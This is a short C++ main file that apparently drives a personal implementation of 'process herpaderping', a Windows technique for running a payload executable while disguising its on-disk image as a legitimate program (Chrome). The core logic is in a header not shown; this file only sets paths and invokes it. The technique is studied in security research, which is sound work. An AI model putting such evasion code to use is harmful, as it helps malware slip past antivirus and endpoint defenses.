#include <Windows.h>
#include <iostream>
#include "Herpaderping.h"

constexpr auto PATH_TO_SOURCE = "C:\\Users\\idano\\Workspace\\Projects\\Herpaderping\\x64\\Debug\\Payload.exe";
constexpr auto PATH_TO_TARGET = "C:\\Users\\idano\\Workspace\\Projects\\Herpaderping\\x64\\Debug\\target2.exe";
constexpr auto PATH_TO_COVER = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";

constexpr auto PROCESS_CREATE_FLAGS_INHERIT_HANDLES = 0x00000004;

int main()
{	
	auto herpaderping = Herpaderping(std::string(PATH_TO_SOURCE), std::string(PATH_TO_TARGET), std::string(PATH_TO_COVER));

	try {
		herpaderping.run_process_with_cover();
	}
	catch (std::runtime_error& exc) {
		std::cout << "Exception: " + std::string(exc.what()) << std::endl;
		exit(1);
	}

	return 0;

	return 0;
}